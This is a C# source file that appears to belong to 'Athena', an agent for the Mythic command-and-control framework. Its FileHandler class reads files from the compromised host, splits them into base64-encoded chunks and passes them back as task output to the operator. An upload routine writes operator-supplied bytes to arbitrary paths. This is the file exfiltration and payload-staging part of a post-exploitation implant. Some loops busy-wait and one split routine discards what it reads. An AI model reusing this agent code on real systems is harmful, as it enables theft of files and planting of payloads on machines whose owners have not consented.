using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Athena.Mythic.Model;
using Athena.Utilities;

namespace Athena.Commands
{
    public class FileHandler
    {
        public static bool downloadFile(MythicDownloadJob job)
        {
            Globals.downloadJobs.Add(job.task.id, job);
            MythicJob j = Globals.jobs[job.task.id];
            FileInfo fi = new FileInfo(job.path);
            job.total_chunks = GetTotalChunks(job.path, job.chunk_size);
            j.started = true;
            j.taskresult = "";
            j.hasoutput = true;
            while (string.IsNullOrEmpty(job.file_id))
            {
                //Wait until initial request is sent out
            }
            if (job.total_chunks == 1)
            {
                j.taskresult = Misc.Base64Encode(File.ReadAllBytes(job.path));
                job.chunk_num = 1;
                j.complete = true;
                j.hasoutput = true;
            }
            else
            {

                try
                {
                    job.chunk_num = 1;
                    FileStream fileStream = new FileStream(job.path, FileMode.Open, FileAccess.Read);
                    using (fileStream)
                    {
                        byte[] buffer = new byte[job.chunk_size];
                        fileStream.Seek(0, SeekOrigin.Begin);
                        long totalBytes = 0;
                        int bytesRead = fileStream.Read(buffer, 0, job.chunk_size);
                        totalBytes += bytesRead;
                        byte[] testbuf = { buffer[0], buffer[1], buffer[2], buffer[3] };
                        Console.WriteLine($"{BitConverter.ToString(testbuf)} ");
                        j.taskresult = Misc.Base64Encode(buffer);
                        j.hasoutput = true;
                        while (j.taskresult != "")
                        {

                        }
                        job.chunk_num++;
                        while (bytesRead > 0)
                        {
                            if(fi.Length - totalBytes < job.chunk_size)
                            {
                                buffer = new byte[fi.Length - totalBytes];
                                bytesRead = fileStream.Read(buffer, 0, (int)(fi.Length - totalBytes));
                                totalBytes += bytesRead;
                                j.taskresult = Misc.Base64Encode(buffer);
                                j.hasoutput = true;
                            }
                            else
                            {
                                bytesRead = fileStream.Read(buffer, 0, job.chunk_size);
                                testbuf = new byte[] { buffer[0], buffer[1], buffer[2], buffer[3] };
                                Console.WriteLine($"{BitConverter.ToString(testbuf)} ");
                                j.taskresult = Misc.Base64Encode(buffer);
                                j.hasoutput = true;
                                totalBytes += bytesRead;
                            }
                            while(j.taskresult != "")
                            {

                            }
                            job.chunk_num++;
                        }
                        fileStream.Close();
                    }
                }
                catch (Exception e)
                {
                    j.complete = true;
                    j.errored = true;
                    j.hasoutput = true;
                    j.taskresult = e.Message;
                }
            }
            return true;
        }

        public static string uploadFile(string path, byte[] file)
        {
            try
            {
                File.WriteAllBytes(path, file);
                return $"File successfully written to {path}";
            }
            catch (Exception e)
            {
                return e.Message;
            }
        }
        public static string GetChunk(string File, int ChunkNum, int TotalChunks, long FileSize, int chunksize)
        {
            try
            {
                byte[] file_chunk = null;
                long pos = ChunkNum * chunksize;
                Console.WriteLine(pos);
                using (FileStream fileStream = new FileStream(File, FileMode.Open))
                {
                    fileStream.Position = pos;
                    if (TotalChunks == ChunkNum)
                    {
                        file_chunk = new byte[FileSize - (ChunkNum * chunksize)];
                        int chunk_size = file_chunk.Length;
                        fileStream.Read(file_chunk, 0, chunk_size);
                    }
                    else
                    {
                        file_chunk = new byte[chunksize];
                        fileStream.Read(file_chunk, 0, chunksize);
                    }
                }
                return Convert.ToBase64String(file_chunk);
            }
            catch
            {
                return "Error reading file";
            }
        }
        public static int GetTotalChunks(string File, int chunksize)
        {
            var fi = new FileInfo(File);
            int total_chunks = (int)(fi.Length + chunksize - 1) / chunksize;
            return total_chunks;
        }

        static void Split(string infile, string directoryPath, string Name, int ChunkSize, string ChunkName) //split function
        {
            Console.WriteLine("[*] - Starting Chunking");
            int bytesToRead = 1000000 * ChunkSize;// 1mb
            Console.WriteLine(bytesToRead);

            try
            {
                FileStream fileStream = new FileStream(infile, FileMode.Open, FileAccess.Read);
                using (fileStream)
                {
                    byte[] buffer = new byte[bytesToRead];
                    fileStream.Seek(0, SeekOrigin.Begin);
                    int bytesRead = fileStream.Read(buffer, 0, bytesToRead);
                    while (bytesRead > 0)
                    {
                        bytesRead = fileStream.Read(buffer, 0, bytesToRead);
                        byte[] testbuf = { buffer[0], buffer[1], buffer[2], buffer[3] };
                        Console.WriteLine($"{BitConverter.ToString(testbuf)} ");
                    }
                    fileStream.Close();
                    Console.WriteLine("[*] - Finished");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Error");
            }
        }
    }
}
